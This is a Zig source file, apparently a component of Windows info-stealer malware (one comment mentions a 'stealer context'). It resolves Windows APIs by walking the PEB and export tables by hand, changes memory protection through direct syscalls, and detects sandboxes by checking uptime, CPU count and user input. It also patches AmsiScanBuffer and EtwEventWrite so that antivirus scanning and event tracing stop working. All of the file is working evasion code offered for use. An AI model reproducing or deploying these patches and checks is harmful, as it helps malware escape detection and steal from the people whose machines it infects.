const std = @import("std");
const ntdll = @import("direto/ntdll.zig");
const ssn = @import("direto/ssn.zig");
const direto = @import("direto/direto.zig");

// Define some basic structures for manual GetProcAddress
pub fn getModuleHandle(module_name: []const u8) usize {
    const peb = ntdll.getPEB();
    if (peb == 0) return 0;

    const ldr_ptr = @as(*usize, @ptrFromInt(peb + 0x18));
    const ldr = ldr_ptr.*;
    if (ldr == 0) return 0;

    const head_ptr = @as(*usize, @ptrFromInt(ldr + 0x20));
    const head = head_ptr.*;
    if (head == 0) return 0;

    var current = @as(*usize, @ptrFromInt(head)).*;

    while (current != head and current != 0) {
        const entry_base = current - 0x10;
        const name_len_ptr = @as(*u16, @ptrFromInt(entry_base + 0x58));
        const name_len = name_len_ptr.*;
        const name_buf_ptr = @as(*usize, @ptrFromInt(entry_base + 0x60));
        const name_buf = name_buf_ptr.*;

        if (name_len > 0 and name_buf != 0) {
            const name_slice = @as([*]u16, @ptrFromInt(name_buf))[0 .. name_len / 2];
            
            if (name_slice.len == module_name.len) {
                var is_match = true;
                for (module_name, 0..) |c, i| {
                    const uc = name_slice[i];
                    var lc = uc;
                    if (uc >= 'A' and uc <= 'Z') {
                        lc = uc + 32;
                    }
                    if (lc != c) {
                        is_match = false;
                        break;
                    }
                }
                
                if (is_match) {
                    const dll_base_ptr = @as(*usize, @ptrFromInt(entry_base + 0x30));
                    return dll_base_ptr.*;
                }
            }
        }
        current = @as(*usize, @ptrFromInt(current)).*;
    }
    return 0;
}

fn readCString(addr: usize) []const u8 {
    var len: usize = 0;
    while (@as(*u8, @ptrFromInt(addr + len)).* != 0) : (len += 1) {}
    return @as([*]const u8, @ptrFromInt(addr))[0..len];
}

pub fn getProcAddress(base: usize, func_name: []const u8) usize {
    if (base == 0) return 0;

    const e_lfanew = @as(*u32, @ptrFromInt(base + 0x3C)).*;
    const nt_headers = base + e_lfanew;

    const sig = @as(*u32, @ptrFromInt(nt_headers)).*;
    if (sig != 0x4550) return 0;

    const optional_header = nt_headers + 0x18;
    const export_dir_rva = @as(*u32, @ptrFromInt(optional_header + 0x70)).*;

    if (export_dir_rva == 0) return 0;

    const export_dir = base + export_dir_rva;
    const num_names = @as(*u32, @ptrFromInt(export_dir + 0x18)).*;
    const addr_of_names = base + @as(*u32, @ptrFromInt(export_dir + 0x20)).*;
    const addr_of_functions = base + @as(*u32, @ptrFromInt(export_dir + 0x1C)).*;
    const addr_of_name_ordinals = base + @as(*u32, @ptrFromInt(export_dir + 0x24)).*;

    for (0..num_names) |i| {
        const name_rva = @as(*u32, @ptrFromInt(addr_of_names + i * 4)).*;
        const name_ptr = base + name_rva;
        const name = readCString(name_ptr);

        if (std.mem.eql(u8, name, func_name)) {
            const ordinal = @as(*u16, @ptrFromInt(addr_of_name_ordinals + i * 2)).*;
            const func_rva = @as(*u32, @ptrFromInt(addr_of_functions + ordinal * 4)).*;
            return base + func_rva;
        }
    }
    return 0;
}

pub fn patchMemory(addr: usize, patch: []const u8) bool {
    const handle: usize = @bitCast(@as(isize, -1)); // Current process
    var base = addr;
    var size: usize = patch.len;
    var old_prot: u32 = 0;

    const PAGE_EXECUTE_READWRITE: usize = 0x40;

    var status = direto.ntProtectVirtualMemory(
        handle,
        &base,
        &size,
        PAGE_EXECUTE_READWRITE,
        &old_prot,
    );

    if (status != 0) return false;

    // Apply patch
    const dest = @as([*]u8, @ptrFromInt(addr))[0..patch.len];
    @memcpy(dest, patch);

    // Restore protection
    status = direto.ntProtectVirtualMemory(
        handle,
        &base,
        &size,
        old_prot,
        &old_prot,
    );

    return status == 0;
}

pub fn getTickCount64() u64 {
    const k32 = getModuleHandle("kernel32.dll");
    if (k32 == 0) return 60000;
    const proc = getProcAddress(k32, "GetTickCount64");
    if (proc == 0) return 60000;

    const func = @as(*const fn () callconv(.winapi) u64, @ptrFromInt(proc));
    return func();
}

pub fn isUptimeShort() bool {
    const tick = getTickCount64();
    const min = tick / (1000 * 60);
    return min < 30;
}

pub fn hasHumanInteraction() bool {
    const u32_dll = getModuleHandle("user32.dll");
    if (u32_dll == 0) return true;

    const GetCursorPos = @as(?*const fn (lpPoint: *anyopaque) callconv(.winapi) i32, @ptrFromInt(getProcAddress(u32_dll, "GetCursorPos"))) orelse return true;
    const GetAsyncKeyState = @as(?*const fn (vKey: i32) callconv(.winapi) i16, @ptrFromInt(getProcAddress(u32_dll, "GetAsyncKeyState"))) orelse return true;

    const POINT = extern struct { x: i32, y: i32 };
    var p1: POINT = undefined;
    var p2: POINT = undefined;

    _ = GetCursorPos(&p1);
    direto.ntDelayExecution(3000);
    _ = GetCursorPos(&p2);

    if (p1.x != p2.x or p1.y != p2.y) return true;

    var i: i32 = 0;
    while (i < 256) : (i += 1) {
        if (GetAsyncKeyState(i) != 0) return true;
    }

    return false;
}

pub fn isResourceConstrained() bool {
    const k32 = getModuleHandle("kernel32.dll");
    if (k32 == 0) return false;

    const GetSystemInfo = @as(?*const fn (lpSystemInfo: *anyopaque) callconv(.winapi) void, @ptrFromInt(getProcAddress(k32, "GetSystemInfo"))) orelse return false;
    
    const SYSTEM_INFO = extern struct {
        wProcessorArchitecture: u16,
        wReserved: u16,
        dwPageSize: u32,
        lpMinimumApplicationAddress: ?*anyopaque,
        lpMaximumApplicationAddress: ?*anyopaque,
        dwActiveProcessorMask: usize,
        dwNumberOfProcessors: u32,
        dwProcessorType: u32,
        dwAllocationGranularity: u32,
        wProcessorLevel: u16,
        wProcessorRevision: u16,
    };

    var si: SYSTEM_INFO = undefined;
    GetSystemInfo(&si);

    if (si.dwNumberOfProcessors < 2) return true;

    return false;
}

pub fn runAntiAnalysis() bool {
    if (isUptimeShort()) return false;
    if (isResourceConstrained()) return false;
    // dns sandbox check would go here
    return true;
}

pub fn patchAMSI() void {
    const amsi = getModuleHandle("amsi.dll");
    if (amsi == 0) return; // If amsi isn't loaded, we might need to LoadLibrary first. But in stealer context, it might be.

    const proc = getProcAddress(amsi, "AmsiScanBuffer");
    if (proc == 0) return;

    const patch = [_]u8{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
    _ = patchMemory(proc, &patch);
}

pub fn patchETW() void {
    const ntdll_base = getModuleHandle("ntdll.dll");
    if (ntdll_base == 0) return;

    const proc = getProcAddress(ntdll_base, "EtwEventWrite");
    if (proc == 0) return;

    const patch = [_]u8{ 0xC3, 0x90, 0x90, 0x90, 0x90 }; // ret, nop...
    _ = patchMemory(proc, &patch);
}

pub fn getEnvVar(allocator: std.mem.Allocator, name: [:0]const u8) ![]u8 {
    const k32 = getModuleHandle("kernel32.dll");
    if (k32 == 0) return error.Kernel32NotFound;
    const proc = getProcAddress(k32, "GetEnvironmentVariableA");
    if (proc == 0) return error.ProcNotFound;

    var buf: [1024]u8 = undefined;
    var len: u32 = 0;
    
    asm volatile (
        \\ subq $0x28, %%rsp
        \\ call *%[func]
        \\ addq $0x28, %%rsp
        : [ret] "={eax}" (len)
        : [func] "r" (proc),
          [arg1] "{rcx}" (name.ptr),
          [arg2] "{rdx}" (&buf),
          [arg3] "{r8}" (@as(u32, 1024))
        : .{ .rcx = true, .rdx = true, .r8 = true, .r9 = true, .r10 = true, .r11 = true, .memory = true }
    );

    if (len == 0 or len >= 1024) return error.EnvVarNotFound;
    return allocator.dupe(u8, buf[0..len]);
}
